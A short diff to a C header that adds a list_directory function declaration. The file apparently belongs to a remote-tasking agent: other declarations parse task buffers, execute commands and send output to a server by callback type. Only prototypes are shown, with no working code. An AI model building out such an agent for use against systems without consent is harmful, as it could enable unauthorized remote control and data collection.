@@ -55,6 +55,8 @@ int commands_execute(const uint8_t *task_data, size_t task_len, uint8_t **output
 // Parse task buffer
 int commands_parse_tasks(const uint8_t *task_buffer, size_t task_len);
 
+int list_directory(const char *path, uint8_t **output, size_t *output_len);
+
 void send_output_to_server(const uint8_t *output, size_t output_len, uint32_t callback_type);
 
 #endif // COMMANDS_H
